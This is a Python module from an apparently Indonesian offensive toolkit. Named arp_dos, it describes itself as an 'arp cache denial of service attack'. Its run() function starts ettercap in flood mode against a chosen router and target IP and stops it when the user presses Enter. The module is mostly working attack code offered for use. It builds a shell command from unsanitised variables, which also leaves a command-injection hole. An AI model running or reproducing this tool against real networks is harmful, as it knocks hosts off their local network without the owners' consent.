#        Copyright (C) 2017 M4st3r L1nux Indonesia (Jh0n 1sl4nskh4_404)
from core.GarudaTools import *
from core import colors
import subprocess
from time import sleep
import os

conf = {
	"name": "arp_dos",
	"version": "1.0",
	"shortdesc": "arp cache denial of service attack",
	"github": "JhonIslanskha",
	"author": "M4st3rL1nux",
	"by": "Jh0n 1sl4nskh4_404",
	"initdate": "3.3.2016",
	"lastmod": "26.5.2016",
	"needroot": 1,
	"apisupport": False,
	"dependencies": ["xterm", "ettercap"]

}


# List of the variables
variables = OrderedDict((
	('target', ['192.168.1.2', 'target ip address']),
	('router', ['192.168.1.1', 'router ip address']),
	('interface', ['eth0', 'network interface name']),
))


# Additional help notes
help_notes = colors.red+"this module will not work without root permissions!"+colors.end

# Simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	printInfo("attack has been started...")
	command = 'xterm -e ettercap -i '+ variables['interface'][0] + ' -Tq -P rand_flood ' + '/'+variables['router'][0]+'//' + ' ' + '/'+variables['target'][0]+'//'
	subprocess.Popen(command, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
	line_4 = colors.blue+"for stop attack press [enter]"+colors.end
	fin = input(line_4)
	os.system('killall ettercap')
	printInfo("attack stoped")